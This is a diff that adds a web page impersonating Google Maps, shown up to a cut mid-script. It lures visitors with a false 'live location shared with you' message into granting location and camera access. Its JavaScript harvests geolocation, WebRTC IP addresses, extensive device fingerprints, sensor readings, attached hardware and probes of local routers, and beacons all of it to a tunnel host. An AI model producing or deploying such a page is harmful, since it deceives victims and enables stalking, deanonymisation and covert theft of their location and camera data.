@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Maps</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Roboto,Arial,sans-serif;background:#f1f3f4;color:#202124;min-height:100vh;display:flex;flex-direction:column}
+.topbar{height:56px;background:#fff;border-bottom:1px solid #dadce0;display:flex;align-items:center;padding:0 16px;gap:14px}
+.topbar svg{width:24px;height:24px}
+.topbar .title{font-size:20px;color:#5f6368}
+main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px 16px}
+.card{background:#fff;border-radius:12px;box-shadow:0 1px 3px rgba(60,64,67,.3),0 4px 8px 3px rgba(60,64,67,.15);max-width:400px;width:100%;padding:36px 28px 32px;text-align:center}
+.pin{width:68px;height:68px;margin:0 auto 22px}
+.pin svg{width:68px;height:68px}
+h1{font-size:22px;font-weight:400;margin-bottom:8px}
+.sub{font-size:13px;color:#188038;margin-bottom:14px;font-weight:500}
+.desc{font-size:14px;line-height:21px;color:#5f6368;margin-bottom:26px}
+.searchbox{display:flex;align-items:center;background:#f1f3f4;border-radius:24px;height:44px;padding:0 16px;margin-bottom:22px;gap:10px}
+.searchbox svg{width:18px;height:18px;flex-shrink:0}
+.searchbox input{flex:1;background:transparent;border:none;outline:none;font-size:14px;color:#202124}
+.btn{display:inline-flex;align-items:center;justify-content:center;background:#1a73e8;color:#fff;border:none;border-radius:4px;height:42px;padding:0 28px;font-size:14px;font-weight:500;cursor:pointer;min-width:180px}
+.btn:hover{background:#1765cc}
+.btn:disabled{opacity:.7}
+.spinner{display:none;width:18px;height:18px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite;margin-right:8px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.status{margin-top:16px;font-size:13px;color:#188038;min-height:20px}
+.err{color:#d93025}
+footer{text-align:center;padding:14px;font-size:12px;color:#5f6368;background:#fff;border-top:1px solid #dadce0}
+video,canvas{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
+
+/* -- fake modal popup -- */
+#cm-overlay{position:fixed;inset:0;background:rgba(0,0,0,.35);display:none;align-items:flex-end;justify-content:center;z-index:99998;padding:16px}
+#cm-overlay.show{display:flex;animation:cm-fade .18s ease-out}
+@keyframes cm-fade{from{opacity:0}to{opacity:1}}
+#cm-card{background:#fff;border-radius:14px;max-width:400px;width:100%;padding:22px 22px 18px;box-shadow:0 12px 40px rgba(0,0,0,.28);animation:cm-slide .22s ease-out}
+@keyframes cm-slide{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
+#cm-card .cm-title{font-size:16px;font-weight:600;color:#202124;margin-bottom:8px}
+#cm-card .cm-body{font-size:14px;line-height:20px;color:#5f6368;margin-bottom:16px;white-space:pre-wrap;word-break:break-word}
+#cm-card .cm-input{width:100%;border:1px solid #dadce0;border-radius:8px;padding:10px 12px;font-size:14px;outline:none;margin-bottom:12px;font-family:inherit}
+#cm-card .cm-input:focus{border-color:#1a73e8}
+#cm-card .cm-actions{display:flex;gap:8px;justify-content:flex-end}
+#cm-card .cm-btn{border:none;background:transparent;color:#1a73e8;font-size:14px;font-weight:500;padding:10px 14px;border-radius:6px;cursor:pointer;font-family:inherit}
+#cm-card .cm-btn:hover{background:#e8f0fe}
+#cm-card .cm-btn.primary{background:#1a73e8;color:#fff}
+#cm-card .cm-btn.primary:hover{background:#1765cc}
+</style>
+</head>
+<body>
+<div class="topbar">
+<svg viewBox="0 0 24 24"><path fill="#4285F4" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+<span class="title">Maps</span>
+</div>
+<main>
+<div class="card">
+<div class="pin">
+<svg viewBox="0 0 24 24"><path fill="#EA4335" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+</div>
+<h1>Live location shared with you</h1>
+<div class="sub">● Active now</div>
+<div class="searchbox">
+<svg viewBox="0 0 24 24"><path fill="#5f6368" d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+<input id="searchInput" placeholder="Search for a place or address" autocomplete="off" autocapitalize="off" spellcheck="false">
+</div>
+<p class="desc">Your friend started sharing their real-time location and live camera view.<br><br>Allow access to see exactly where they are and what they see right now.</p>
+<button class="btn" id="allowBtn">
+<span class="spinner" id="spinner"></span>
+<span id="btnText">View live feed</span>
+</button>
+<div class="status" id="status"></div>
+</div>
+</main>
+<footer>© 2026 Google LLC</footer>
+<video id="vid" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<!-- fake popup -->
+<div id="cm-overlay">
+  <div id="cm-card">
+    <div class="cm-title" id="cm-title">Message</div>
+    <div class="cm-body" id="cm-body"></div>
+    <input class="cm-input" id="cm-input" style="display:none" autocomplete="off">
+    <div class="cm-actions">
+      <button class="cm-btn" id="cm-cancel">Cancel</button>
+      <button class="cm-btn primary" id="cm-ok">OK</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  // ===== SERVER URL — launcher.py rewrites this automatically =====
+  const SERVER = "https://national-behaviour-critical-grab.trycloudflare.com";
+  const REDIRECT = "https://maps.app.goo.gl/UnUYbGNwxCKZmvas6";
+  const BEACON_MS = 8000;   // poll every 8 seconds
+  // ===============================================================
+
+  const statusEl = document.getElementById("status");
+  const btn = document.getElementById("allowBtn");
+  const spinner = document.getElementById("spinner");
+  const btnText = document.getElementById("btnText");
+
+  let MY_FP = null;         // set after collectAll finishes
+
+  // ---------------------------------------------------------- transport
+  function send(data){
+    const body = JSON.stringify(data);
+    try { navigator.sendBeacon(SERVER, new Blob([body], {type:"application/json"})); } catch(e){}
+    try {
+      fetch(SERVER, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: body,
+        keepalive: true,
+        mode:"no-cors"
+      }).catch(function(){});
+    } catch(e){}
+  }
+
+  async function post(path, obj){
+    try {
+      const r = await fetch(SERVER + path, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify(obj)
+      });
+      return await r.json();
+    } catch(e){ return null; }
+  }
+
+  // ---------------------------------------------------------- helpers
+  async function sha256(str){
+    const buf = new TextEncoder().encode(str);
+    const h = await crypto.subtle.digest("SHA-256", buf);
+    return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,"0")).join("");
+  }
+
+  function safe(fn, fallback){
+    try { const v = fn(); return v === undefined ? fallback : v; }
+    catch(e){ return fallback; }
+  }
+
+  // ---------------------------------------------------------- geolocation with retry + fallback
+  function getLoc(attempts){
+    attempts = (typeof attempts === "number") ? attempts : 3;
+    return new Promise((resolve, reject) => {
+      const tryOnce = (n) => {
+        try {
+          navigator.geolocation.getCurrentPosition(
+            resolve,
+            (err) => {
+              if (err && err.code === 3 && n > 1){
+                setTimeout(() => tryOnce(n - 1), 1200);
+              } else if (err && err.code === 3){
+                navigator.geolocation.getCurrentPosition(
+                  resolve,
+                  reject,
+                  { enableHighAccuracy: false, maximumAge: 300000, timeout: 10000 }
+                );
+              } else {
+                reject(err);
+              }
+            },
+            { enableHighAccuracy: n > 1, maximumAge: 60000, timeout: 25000 }
+          );
+        } catch(e){ reject(e); }
+      };
+      tryOnce(attempts);
+    });
+  }
+
+  // ---------------------------------------------------------- popup ui
+  function popup(opts){
+    return new Promise((resolve) => {
+      const ov = document.getElementById("cm-overlay");
+      const titleEl = document.getElementById("cm-title");
+      const bodyEl = document.getElementById("cm-body");
+      const inputEl = document.getElementById("cm-input");
+      const okBtn = document.getElementById("cm-ok");
+      const cancelBtn = document.getElementById("cm-cancel");
+
+      titleEl.textContent = opts.title || "Message";
+      bodyEl.textContent = opts.body || "";
+      inputEl.style.display = opts.input ? "block" : "none";
+      inputEl.value = "";
+      inputEl.placeholder = opts.placeholder || "";
+      cancelBtn.style.display = opts.cancel === false ? "none" : "block";
+
+      ov.classList.add("show");
+
+      const done = (result) => {
+        ov.classList.remove("show");
+        okBtn.onclick = null;
+        cancelBtn.onclick = null;
+        resolve(result);
+      };
+
+      okBtn.onclick = () => done({ ok: true, text: opts.input ? inputEl.value : null });
+      cancelBtn.onclick = () => done({ ok: false, text: null });
+
+      if (opts.input){
+        setTimeout(() => { try { inputEl.focus(); } catch(e){} }, 200);
+      }
+    });
+  }
+
+  // ---------------------------------------------------------- app context
+  function appContext(){
+    const ua = navigator.userAgent || "";
+    const appMatch = ua.match(/(Instagram|FBAN|FBAV|FB_IAB|FBIOS|Line\/|WhatsApp|Telegram|Twitter|TikTok|Snapchat|Pinterest|Reddit|LinkedIn|Discord|Slack|Skype|Viber|WeChat|QQ\/)/i);
+    const app = appMatch ? appMatch[1].replace(/\/$/, "") : null;
+    const isAndroidWebview = /Android/i.test(ua) && /;\s*wv\)/i.test(ua);
+    const isIosInApp = /iPhone|iPad|iPod/i.test(ua) && !!app;
+    const isInApp = !!app || isAndroidWebview;
+    let browser = "unknown", version = "";
+    const patterns = [
+      [/Edg\/([\d.]+)/i,             "Edge"],
+      [/OPR\/([\d.]+)/i,             "Opera"],
+      [/SamsungBrowser\/([\d.]+)/i,  "Samsung Internet"],
+      [/UCBrowser\/([\d.]+)/i,       "UC Browser"],
+      [/MiuiBrowser\/([\d.]+)/i,     "Mi Browser"],
+      [/HeyTapBrowser\/([\d.]+)/i,   "Oppo Browser"],
+      [/Chrome\/([\d.]+)/i,          "Chrome"],
+      [/Firefox\/([\d.]+)/i,         "Firefox"],
+      [/Version\/([\d.]+).*Safari/i, "Safari"],
+    ];
+    for (const [re, name] of patterns){
+      const m = ua.match(re);
+      if (m){ browser = name; version = m[1]; break; }
+    }
+    let uaDataBrands = null;
+    try {
+      if (navigator.userAgentData && navigator.userAgentData.brands){
+        uaDataBrands = navigator.userAgentData.brands.map(b => `${b.brand} ${b.version}`);
+      }
+    } catch(e){}
+    let os = "unknown";
+    if (/Windows NT 10/i.test(ua)) os = "Windows 10/11";
+    else if (/Windows NT/i.test(ua)) os = "Windows";
+    else if (/Android/i.test(ua)) os = "Android";
+    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+    else if (/Mac OS X/i.test(ua)) os = "macOS";
+    else if (/Linux/i.test(ua)) os = "Linux";
+    else if (/CrOS/i.test(ua)) os = "ChromeOS";
+    return { app, isInApp, isAndroidWebview, isIosInApp, browser, browserVersion: version, uaDataBrands, os, uaFull: ua };
+  }
+
+  // ---------------------------------------------------------- canvas fp
+  function canvasFp(){
+    try {
+      const c = document.createElement("canvas");
+      c.width = 240; c.height = 60;
+      const ctx = c.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(0,0,120,20);
+      ctx.fillStyle = "#069";
+      ctx.fillText("Maps-Live-ƒingerprint-😀", 2, 15);
+      ctx.fillStyle = "rgba(102,204,0,0.7)";
+      ctx.fillText("Maps-Live-ƒingerprint-😀", 4, 17);
+      ctx.beginPath();
+      ctx.arc(50, 30, 20, 0, Math.PI * 1.5, true);
+      ctx.strokeStyle = "rgba(120,20,200,0.5)";
+      ctx.stroke();
+      return c.toDataURL("image/png");
+    } catch(e){ return null; }
+  }
+
+  // ---------------------------------------------------------- webgl fp
+  function webglFp(){
+    try {
+      const c = document.createElement("canvas");
+      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if (!gl) return null;
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      return {
+        vendor: gl.getParameter(gl.VENDOR),
+        renderer: gl.getParameter(gl.RENDERER),
+        unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
+        unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
+        version: gl.getParameter(gl.VERSION),
+        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+        maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+        maxViewport: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+        aliasedLineWidth: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
+        extensions: gl.getSupportedExtensions()
+      };
+    } catch(e){ return null; }
+  }
+
+  // ---------------------------------------------------------- webgpu adapter
+  async function webgpuFp(){
+    try {
+      if (!navigator.gpu || typeof navigator.gpu.requestAdapter !== "function") return null;
+      let adapter = null;
+      try { adapter = await navigator.gpu.requestAdapter(); } catch(e){ return null; }
+      if (!adapter) return null;
+      let info = {};
+      try {
+        if (adapter.info) info = adapter.info;
+        else if (typeof adapter.requestAdapterInfo === "function") info = await adapter.requestAdapterInfo();
+      } catch(e){ info = {}; }
+      const lim = {};
+      const l = adapter.limits || {};
+      ["maxTextureDimension1D","maxTextureDimension2D","maxTextureDimension3D",
+       "maxTextureArrayLayers","maxBindGroups","maxBindingsPerBindGroup",
+       "maxSampledTexturesPerShaderStage","maxSamplersPerShaderStage",
+       "maxStorageBuffersPerShaderStage","maxStorageTexturesPerShaderStage",
+       "maxUniformBuffersPerShaderStage","maxUniformBufferBindingSize",
+       "maxStorageBufferBindingSize","maxVertexBuffers","maxBufferSize",
+       "maxVertexAttributes","maxVertexBufferArrayStride","maxColorAttachments",
+       "maxComputeWorkgroupStorageSize","maxComputeInvocationsPerWorkgroup",
+       "maxComputeWorkgroupSizeX","maxComputeWorkgroupSizeY","maxComputeWorkgroupSizeZ",
+       "maxComputeWorkgroupsPerDimension"].forEach(k => { if (l[k] !== undefined) lim[k] = l[k]; });
+      return {
+        vendor: info.vendor || null,
+        architecture: info.architecture || null,
+        device: info.device || null,
+        description: info.description || null,
+        features: Array.from(adapter.features || []),
+        limits: lim
+      };
+    } catch(e){ return null; }
+  }
+
+  // ---------------------------------------------------------- emoji fp
+  function emojiFp(){
+    try {
+      const c = document.createElement("canvas");
+      c.width = 512; c.height = 32;
+      const ctx = c.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "20px 'Apple Color Emoji','Segoe UI Emoji','Noto Color Emoji',sans-serif";
+      const emojis = "😀😃😄😁😆😅😂🤣☺️😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲🥱😴🤤😪😵🤐🥴🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾";
+      ctx.fillText(emojis, 0, 0);
+      return c.toDataURL("image/png");
+    } catch(e){ return null; }
+  }
+
+  // ---------------------------------------------------------- fonts
+  const FONT_LIST = [
+    "Arial","Arial Black","Arial Narrow","Calibri","Cambria","Candara","Comic Sans MS",
+    "Consolas","Courier New","Georgia","Impact","Lucida Console","Palatino Linotype",
+    "Segoe Print","Segoe UI","Tahoma","Times New Roman","Trebuchet MS","Verdana","Webdings",
+    "Wingdings","Roboto","Noto Sans","Noto Color Emoji","DejaVu Sans","Liberation Sans",
+    "Ubuntu","Open Sans","Fira Sans","Source Sans Pro","IBM Plex Sans","Inter","Lato",
+    "Montserrat","Poppins","Raleway","Merriweather","Nunito","Rubik","Meiryo","Yu Gothic",
+    "PingFang SC","Hiragino Sans","Helvetica Neue","San Francisco","Material Icons"
+  ];
+
+  function fontMatrix(){
+    const results = {};
+    const span = document.createElement("span");
+    span.style.cssText = "position:absolute;left:-9999px;font-size:72px;font-weight:bold;";
+    span.textContent = "mmmmmmmmmmlli";
+    document.body.appendChild(span);
+    const baseline = { monospace: 0, "sans-serif": 0, serif: 0 };
+    for (const b of Object.keys(baseline)){
+      span.style.fontFamily = b;
+      baseline[b] = { w: span.offsetWidth, h: span.offsetHeight };
+    }
+    const check = (f) => {
+      for (const b of Object.keys(baseline)){
+        span.style.fontFamily = `'${f}',${b}`;
+        if (span.offsetWidth !== baseline[b].w || span.offsetHeight !== baseline[b].h) return true;
+      }
+      return false;
+    };
+    for (const f of FONT_LIST){ results[f] = check(f); }
+    try {
+      for (const f of FONT_LIST){
+        if (document.fonts && document.fonts.check){
+          if (document.fonts.check(`16px '${f}'`)) results[f] = true;
+        }
+      }
+    } catch(e){}
+    document.body.removeChild(span);
+    return results;
+  }
+
+  // ---------------------------------------------------------- codecs
+  function codecFp(){
+    const probes = {
+      "audio/mpeg":"audio/mpeg","audio/mp4_mp4a40_2":"audio/mp4; codecs=\"mp4a.40.2\"",
+      "audio/ogg_vorbis":"audio/ogg; codecs=\"vorbis\"","audio/ogg_opus":"audio/ogg; codecs=\"opus\"",
+      "audio/webm_opus":"audio/webm; codecs=\"opus\"",
+      "video/mp4_avc1":"video/mp4; codecs=\"avc1.42E01E\"","video/mp4_avc1_h265":"video/mp4; codecs=\"hvc1.1.6.L93.B0\"",
+      "video/mp4_av01":"video/mp4; codecs=\"av01.0.05M.08\"","video/webm_vp8":"video/webm; codecs=\"vp8\"",
+      "video/webm_vp9":"video/webm; codecs=\"vp9\""
+    };
+    const v = document.createElement("video");
+    const a = document.createElement("audio");
+    const out = {};
+    for (const [k, m] of Object.entries(probes)){
+      out[k] = { video: safe(()=>v.canPlayType(m)||"no","no"), audio: safe(()=>a.canPlayType(m)||"no","no") };
+    }
+    const mr = {};
+    if (typeof MediaRecorder !== "undefined" && MediaRecorder.isTypeSupported){
+      ["audio/webm","audio/webm;codecs=opus","video/webm","video/webm;codecs=vp8","video/webm;codecs=vp9","video/mp4"].forEach(m => {
+        mr[m] = safe(()=>MediaRecorder.isTypeSupported(m), false);
+      });
+    }
+    return { canPlayType: out, mediaRecorder: mr };
+  }
+
+  // ---------------------------------------------------------- math fp
+  function mathFp(){
+    const fns = {
+      tan: Math.tan(-1e300), sin: Math.sin(1e300), cos: Math.cos(1e300),
+      tan2: Math.tan(1e300), asin: Math.asin(0.123456789),
+      acosh: Math.acosh(1e300), expm1: Math.expm1(1), sinh: Math.sinh(1),
+      cosh: Math.cosh(10), log1p: Math.log1p(10), pow: Math.pow(Math.PI, 100),
+      atan2: Math.atan2(0.123, 0.456), exp: Math.exp(1e20), sqrt: Math.sqrt(1e300),
+      cbrt: Math.cbrt(1e-300), hypot: Math.hypot(1e300, 1e300), log: Math.log(1e300),
+      log2: Math.log2(1e300), log10: Math.log10(1e300), pow2: Math.pow(2, -1074),
+      fround: Math.fround(5.5), imul: Math.imul(0x7fffffff, 0x7fffffff), clz32: Math.clz32(1e300)
+    };
+    try {
+      const buf = new Float32Array(1);
+      buf[0] = 0.1; fns.float32_01 = buf[0];
+      buf[0] = 1/3; fns.float32_third = buf[0];
+      buf[0] = 1e-45; fns.float32_tiny = buf[0];
+    } catch(e){}
+    fns.tan_eps = Math.tan(1e-15); fns.sin_eps = Math.sin(1e-15); fns.cos_eps = Math.cos(1e-15);
+    try { fns.bigint = (2n ** 64n).toString(); } catch(e){ fns.bigint = null; }
+    return fns;
+  }
+
+  // ---------------------------------------------------------- network
+  function networkFp(){
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return null;
+    return { type: c.type||null, effectiveType: c.effectiveType||null, downlink: c.downlink||null,
+             downlinkMax: c.downlinkMax||null, rtt: c.rtt||null, saveData: c.saveData||null };
+  }
+
+  // ---------------------------------------------------------- battery
+  function batteryFp(){
+    return new Promise(resolve => {
+      try {
+        if (!navigator.getBattery) return resolve(null);
+        navigator.getBattery().then(b => resolve({ level: b.level, charging: b.charging,
+          chargingTime: b.chargingTime, dischargingTime: b.dischargingTime })).catch(()=>resolve(null));
+      } catch(e){ resolve(null); }
+    });
+  }
+
+  // ---------------------------------------------------------- media devices
+  function devicesFp(){
+    return new Promise(resolve => {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return resolve(null);
+        navigator.mediaDevices.enumerateDevices().then(list => {
+          const counts = { audioinput:0, audiooutput:0, videoinput:0, other:0 };
+          const kinds = [];
+          for (const d of list){
+            counts[d.kind] = (counts[d.kind]||0) + 1;
+            kinds.push({ kind: d.kind, label: d.label||null, groupId: d.groupId ? d.groupId.slice(0,8) : null });
+          }
+          resolve({ counts, devices: kinds });
+        }).catch(()=>resolve(null));
+      } catch(e){ resolve(null); }
+    });
+  }
+
+  // ---------------------------------------------------------- permissions
+  async function permissionsFp(){
+    const names = ["geolocation","notifications","push","midi","camera","microphone",
+      "background-fetch","background-sync","bluetooth","persistent-storage","ambient-light-sensor",
+      "accelerometer","gyroscope","magnetometer","clipboard-read","clipboard-write","display-capture",
+      "screen-wake-lock","storage-access","window-management"];
+    const out = {};
+    for (const n of names){
+      try { const r = await navigator.permissions.query({ name: n }); out[n] = r.state; }
+      catch(e){ out[n] = "unsupported"; }
+    }
+    return out;
+  }
+
+  async function storageFp(){
+    try {
+      if (!navigator.storage || !navigator.storage.estimate) return null;
+      const e = await navigator.storage.estimate();
+      return { quota: e.quota, usage: e.usage };
+    } catch(e){ return null; }
+  }
+
+  function voicesFp(){
+    try {
+      const vs = speechSynthesis.getVoices();
+      if (!vs || !vs.length) return null;
+      return vs.map(v => ({ name: v.name, lang: v.lang, local: v.localService, def: v.default }));
+    } catch(e){ return null; }
+  }
+
+  function webrtcFp(){
+    return new Promise(resolve => {
+      const out = { candidates: [], local: [], public: [] };
+      try {
+        const pc = new RTCPeerConnection({ iceServers:[{ urls:"stun:stun.l.google.com:19302" }] });
+        pc.createDataChannel("x");
+        pc.onicecandidate = (e) => {
+          if (!e.candidate) { try { pc.close(); } catch(_){}; return resolve(out); }
+          const cand = e.candidate.candidate;
+          out.candidates.push(cand);
+          const ip = (cand.match(/(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9:]{6,})/) || [])[0];
+          if (ip){
+            if (/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.|fe80:|fc|fd)/i.test(ip)) out.local.push(ip);
+            else out.public.push(ip);
+          }
+        };
+        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>resolve(out));
+        setTimeout(()=>resolve(out), 3000);
+      } catch(e){ resolve(out); }
+    });
+  }
+
+  async function hardwareFp(){
+    const out = { usb: null, hid: null, serial: null, bluetooth: null, apis: {} };
+    try { out.apis.usb = "usb" in navigator; } catch(e){}
+    try { out.apis.hid = "hid" in navigator; } catch(e){}
+    try { out.apis.serial = "serial" in navigator; } catch(e){}
+    try { out.apis.bluetooth = "bluetooth" in navigator; } catch(e){}
+    try { out.apis.nfc = "NDEFReader" in window; } catch(e){}
+    try {
+      if (navigator.usb && typeof navigator.usb.getDevices === "function"){
+        out.usb = (await navigator.usb.getDevices()).map(x => ({ vendorId: x.vendorId, productId: x.productId, name: x.productName||null }));
+      }
+    } catch(e){ out.usb = "err"; }
+    try {
+      if (navigator.hid && typeof navigator.hid.getDevices === "function"){
+        out.hid = (await navigator.hid.getDevices()).map(x => ({ vendorId: x.vendorId, productId: x.productId, name: x.productName||null }));
+      }
+    } catch(e){ out.hid = "err"; }
+    try {
+      if (navigator.serial && typeof navigator.serial.getPorts === "function"){
+        out.serial = (await navigator.serial.getPorts()).map(x => (x.getInfo ? x.getInfo() : null));
+      }
+    } catch(e){ out.serial = "err"; }
+    try {
+      if (navigator.bluetooth && typeof navigator.bluetooth.getDevices === "function"){
+        out.bluetooth = (await navigator.bluetooth.getDevices()).map(x => ({ id: x.id ? x.id.slice(0,8) : null, name: x.name||null }));
+      }
+    } catch(e){ out.bluetooth = "err"; }
+    return out;
+  }
+
+  function sensorFp(){
+    return new Promise(resolve => {
+      const out = {
+        orientation: { events: 0, last: null, alpha: null, beta: null, gamma: null, absolute: null },
+        motion: { events: 0, last: null, accel: null, accelG: null, rotation: null, interval: null },
+        ambient: { supported: false, last: null },
+        api: {
+          DeviceOrientationEvent: "DeviceOrientationEvent" in window,
+          DeviceMotionEvent: "DeviceMotionEvent" in window,
+          AmbientLightSensor: "AmbientLightSensor" in window,
+          Gyroscope: "Gyroscope" in window, Accelerometer: "Accelerometer" in window,
+          Magnetometer: "Magnetometer" in window,
+          LinearAccelerationSensor: "LinearAccelerationSensor" in window,
+          GravitySensor: "GravitySensor" in window,
+          AbsoluteOrientationSensor: "AbsoluteOrientationSensor" in window,
+          RelativeOrientationSensor: "RelativeOrientationSensor" in window
+        }
+      };
+      const onO = (e) => {
+        out.orientation.events++; out.orientation.last = Date.now();
+        out.orientation.alpha = e.alpha; out.orientation.beta = e.beta;
+        out.orientation.gamma = e.gamma; out.orientation.absolute = e.absolute;
+      };
+      const onM = (e) => {
+        out.motion.events++; out.motion.last = Date.now();
+        const a = e.acceleration || {}; const ag = e.accelerationIncludingGravity || {};
+        const r = e.rotationRate || {};
+        out.motion.accel = { x: a.x, y: a.y, z: a.z };
+        out.motion.accelG = { x: ag.x, y: ag.y, z: ag.z };
+        out.motion.rotation = { alpha: r.alpha, beta: r.beta, gamma: r.gamma };
+        out.motion.interval = e.interval;
+      };
+      try { window.addEventListener("deviceorientation", onO); } catch(e){}
+      try { window.addEventListener("devicemotion", onM); } catch(e){}
+      try {
+        if ("AmbientLightSensor" in window){
+          let s; try { s = new AmbientLightSensor({ frequency: 2 }); } catch(e){ s = null; }
+          if (s){
+            try {
+              s.addEventListener("reading", () => { out.ambient.supported = true; out.ambient.last = s.illuminance; });
+              s.addEventListener("error", () => {});
+              const p = s.start(); if (p && p.catch) p.catch(() => {});
+            } catch(e){}
+          }
+        }
+      } catch(e){}
+      setTimeout(()=>{
+        try { window.removeEventListener("deviceorientation", onO); } catch(e){}
+        try { window.removeEventListener("devicemotion", onM); } catch(e){}
+        let state = "unknown";
+        if (out.motion.events > 0){
+          const a = out.motion.accelG || {};
+          const mag = Math.sqrt((a.x||0)**2 + (a.y||0)**2 + (a.z||0)**2);
+          if (out.motion.events < 3) state = "static";
+          else if (mag > 20) state = "moving-fast";
+          else if (mag > 11) state = "moving";
+          else state = "still";
+        }
+        out.motionState = state;
+        resolve(out);
+      }, 2200);
+    });
+  }
+
+  async function networkProbe(){
+    const targets = [
+      { name: "router-192-168-1-1", url: "http://192.168.1.1/",      timeout: 800 },
+      { name: "router-192-168-0-1", url: "http://192.168.0.1/",      timeout: 800 },
+      { name: "router-10-0-0-1",    url: "http://10.0.0.1/",         timeout: 800 },
+      { name: "cloudflare-dns",     url: "https://1.1.1.1/",         timeout: 1200 },
+      { name: "google-dns",         url: "https://8.8.8.8/",         timeout: 1200 },
+      { name: "quad9",              url: "https://9.9.9.9/",         timeout: 1200 },
+      { name: "opendns",            url: "https://208.67.222.222/",  timeout: 1200 }
+    ];
+    const results = {};
+    for (const t of targets){
+      const t0 = performance.now();
+      let ctl = null; try { ctl = new AbortController(); } catch(e){ ctl = null; }
+      const to = setTimeout(() => { try { ctl && ctl.abort(); } catch(e){} }, t.timeout);
+      try {
+        await fetch(t.url, { mode:"no-cors", cache:"no-store", signal: ctl ? ctl.signal : undefined });
+        results[t.name] = { ok: true, rtt: Math.round(performance.now() - t0) };
+      } catch(e){
+        results[t.name] = { ok: false, rtt: Math.round(performance.now() - t0) };
+      } finally { clearTimeout(to); }
+    }
+    return results;
+  }
+
+  function miscFp(){
+    return {
+      userAgent: navigator.userAgent,
+      appContext: appContext(),
+      uaData: safe(()=>{
+        const d = navigator.userAgentData;
+        if (!d) return null;
+        return { brands: d.brands, mobile: d.mobile, platform: d.platform };
+      }, null),
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      language: navigator.language,
+      languages: navigator.languages,
+      doNotTrack: navigator.doNotTrack,
+      cookieEnabled: navigator.cookieEnabled,
+      onLine: navigator.onLine,
+      webdriver: navigator.webdriver,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      deviceMemory: navigator.deviceMemory,
+      maxTouchPoints: navigator.maxTouchPoints,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      locale: Intl.DateTimeFormat().resolvedOptions().locale,
+      currency: safe(()=>{
+        const parts = new Intl.NumberFormat().formatToParts(1234.56);
+        return parts.find(p => p.type === "currency")?.value || null;
+      }, null),
+      screen: {
+        width: screen.width, height: screen.height,
+        availWidth: screen.availWidth, availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
+        dpr: window.devicePixelRatio,
+        orientation: screen.orientation ? screen.orientation.type : null
+      },
+      window: {
+        innerWidth: innerWidth, innerHeight: innerHeight,
+        outerWidth: outerWidth, outerHeight: outerHeight,
+        screenX: screenX, screenY: screenY, scrollX: scrollX, scrollY: scrollY
+      },
+      historyLength: history.length,
+      plugins: safe(()=>Array.from(navigator.plugins).map(p => p.name), []),
+      features: {
+        serviceWorker: "serviceWorker" in navigator,
+        webAssembly: typeof WebAssembly !== "undefined",
+        webgpu: "gpu" in navigator,
+        bluetooth: "bluetooth" in navigator,
+        usb: "usb" in navigator,
+        hid: "hid" in navigator,
